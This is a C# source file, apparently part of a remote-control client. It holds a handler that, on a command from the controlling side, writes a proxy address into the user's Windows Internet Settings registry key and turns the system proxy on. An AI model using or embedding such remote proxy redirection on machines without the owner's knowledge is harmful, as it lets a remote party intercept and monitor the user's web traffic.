using System;
using Microsoft.Win32;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Client.Handlers
{
    class RequestProxyMappingHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestProxyMapping;
                    if (req == null) return;

                    string proxyServer = req.ProxyAddress + ":" + req.ProxyPort;
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Internet Settings", true))
                    {
                        if (key != null)
                        {
                            key.SetValue("ProxyEnable", 1, RegistryValueKind.DWord);
                            key.SetValue("ProxyServer", proxyServer, RegistryValueKind.String);
                        }
                    }
                    DoOutput("代理映射设置成功: " + proxyServer);
                }
                catch (Exception ex)
                {
                    DoOutput("代理映射设置失败: " + ex.Message);
                }
            });
        }
    }
}
